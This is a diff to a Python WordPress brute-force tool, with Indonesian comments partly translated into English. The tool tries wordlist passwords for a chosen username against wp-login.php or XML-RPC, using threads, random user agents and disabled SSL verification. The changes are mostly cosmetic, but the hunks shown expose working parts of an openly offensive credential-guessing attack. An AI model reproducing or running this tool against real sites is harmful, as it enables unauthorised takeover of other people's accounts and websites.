@@ -121,9 +121,9 @@ jembut = """
 
 def urlCMS(url,brutemode):
     if url[:8] != "https://" and url[:7] != "http://":
-        print(r+'\n[!]'+w+' You must insert http:// OR https:// ')
+        print(g+'\n[*]'+w+' You must insert http:// or https:// procotol')
         os._exit(1)
-    # Masuk ke halaman login wordpress
+    # Login Page WordPress
     if brutemode == "std":
        url = url+'/wp-login.php'
     else:
@@ -161,6 +161,7 @@ def connection(url,user,password,UA,timeout,brutemode):
 
     username = user
     pwd = password
+
     http = httplib2.Http(timeout=timeout, disable_ssl_certificate_validation=True)
 
     # HTTP POST Data
@@ -194,7 +195,7 @@ def connection(url,user,password,UA,timeout,brutemode):
               print(r+'[!] HTTP error, code: '+str(response.status))
               os._exit(1)
 
-           # Menghapus semua karakter kosong & membuat baris baru
+           # Menghapus semua karakter kosong & baris baru
            xmlcontent = content.replace(" ", "").replace("\n","")
 
            if not "faultCode" in xmlcontent:
@@ -268,10 +269,10 @@ options = commandList.parse_args()
 
 # Cek mode bruteforce conflict
 if options.standard and options.xml:
-   print (r+"\n[!]"+w+" Standard bruteforce mode [-s]"+w+"/"+y+" [-x] xml-rpc bruteforce mode")
+   print (y+"\n[*] Select standard [-s]"+w+"OR"+y+"xml-rpc [-x] bruteforce mode")
    sys.exit(1)
 
-# Cek argument
+# Check argument
 if not options.standard and not options.xml:
     print(jembut)
     print
@@ -283,7 +284,7 @@ elif not options.target or not options.username or not options.wordlist:
     commandList.print_help()
     sys.exit(1)
 
-# Setel bruteforce mode
+# Set bruteforce mode
 if options.standard:
    brtmd="std"
 else:
@@ -301,21 +302,20 @@ if not os.path.isfile(wlfile) and not os.access(wlfile, os.R_OK):
 
 # Gen Random UserAgent
 UA  = randomAgentGen()
-# Url to url+login_cms_page
 url = urlCMS(url,brtmd)
 
 wlsize = os.path.getsize(wlfile) >>20
 if wlsize < 100:
     with open(wlfile) as f:
-        totalwordlist = sum(bl.count("\n") for bl in blocks(f))
+        wordlisttotal = sum(bl.count("\n") for bl in blocks(f))
 else:
-    totalwordlist="unknown"
+    wordlisttotal="unknown"
 
 print(jembut)
 print
 print(y+'[*] Target           : '+w+options.target)
 print(y+'[*] Username         : '+w+user)
-print(y+'[*] Wordlist Total   : '+w+str(totalwordlist))
+print(y+'[*] Wordlist Total   : '+w+str(wordlisttotal))
 if brtmd == "std":
    print(y+'[*] Bruteforce Mode  :'+w+' Standard')
 else:
@@ -338,11 +338,11 @@ with open(wlfile) as wordlist:
 	    t.start()
 	    threads.append(t)
 	    sys.stdout.write('\r')
-	    sys.stdout.write(g+'[*]'+w+' Bruteforce Running : '+str(count)+'/'+str(totalwordlist))
+	    sys.stdout.write(g+'[*]'+w+' Bruteforce Running : '+str(count)+'/'+str(wordlisttotal))
 	    sys.stdout.flush()
 	    sleep(0.210)
 
 for a in threads:
     a.join()
-# Cek apabila password tidak ditemukan
+# Password tidak ditemukan
 print(r+'\n[!]'+w+' Password NOT found !')
